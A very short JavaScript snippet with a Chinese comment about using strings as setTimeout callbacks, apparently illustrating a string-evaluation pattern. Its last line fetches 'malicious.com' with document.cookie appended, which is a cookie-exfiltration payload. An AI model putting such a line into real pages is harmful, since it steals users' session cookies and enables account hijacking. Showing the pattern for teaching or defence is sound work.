// 使用字符串作为setTimeout的回调
setTimeout("console.log(document.cookie)", 1000);
setTimeout("fetch('https://malicious.com?cookie=' + document.cookie)", 3000);